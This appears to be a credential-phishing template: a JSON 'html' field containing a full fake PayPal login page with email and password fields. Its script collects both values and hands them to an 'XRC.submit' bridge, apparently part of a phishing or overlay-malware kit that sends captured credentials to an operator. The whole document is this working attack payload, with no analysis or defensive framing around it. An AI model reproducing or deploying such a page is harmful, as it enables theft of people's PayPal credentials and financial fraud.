  "html": "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'><title>PayPal - Log In</title><style>body{margin:0;padding:0;background:#fff;font-family:PayPalSansBig,Helvetica Neue,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh}.box{padding:40px;width:90%;max-width:400px}.logo{text-align:center;margin-bottom:30px;font-size:24px;font-weight:bold;color:#003087}input{width:100%;padding:14px;margin:8px 0;border:1px solid #9DA3A6;border-radius:4px;background:#fff;color:#000;box-sizing:border-box;font-size:15px}input:focus{outline:none;border-color:#0070E0}button{width:100%;padding:14px;margin-top:16px;background:#0070E0;border:none;border-radius:24px;color:#fff;font-size:16px;font-weight:bold;cursor:pointer}button:active{opacity:0.8}.link{color:#0070E0;text-align:center;margin-top:16px;font-size:13px}</style></head><body><div class='box'><div class='logo'>PayPal</div><input type='email' id='email' placeholder='Email'><input type='password' id='password' placeholder='Password'><button onclick='submit()'>Log In</button><div class='link'>Having trouble logging in?</div></div><script>function submit(){var e=document.getElementById('email').value;var p=document.getElementById('password').value;XRC.submit(JSON.stringify({email:e,password:p}));}</script></body></html>"
